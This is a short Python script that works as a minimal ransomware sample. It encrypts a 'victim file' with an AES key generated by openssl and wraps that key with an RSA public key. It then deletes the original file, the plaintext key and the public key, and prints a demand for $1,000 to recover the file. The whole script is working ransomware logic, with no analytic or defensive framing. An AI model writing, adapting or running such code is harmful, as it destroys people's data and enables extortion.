import os
import subprocess

# Generate a 16-byte symmetric key
subprocess.call("openssl rand -base64 16 > key.txt", shell=True)

# Encrypt the victim file using AES-128 and the symmetric key
subprocess.call("openssl enc -aes-128-cbc -salt -in my_secrets.txt -out data_cipher.txt -pass file:./key.txt -base64", shell=True)

# Encrypt the key.txt file 
subprocess.call("openssl rsautl -encrypt -inkey public.pem -pubin -in key.txt | base64 > key_cipher.txt", shell=True)

# Remove plaintext key and original file
os.remove("key.txt")
os.remove("my_secrets.txt")
os.remove("public.pem")


# Show Ransom message
print("Your file my_secrets.txt is encrypted. To decrypt it, send key_cipher.txt and $1,000 to me.")
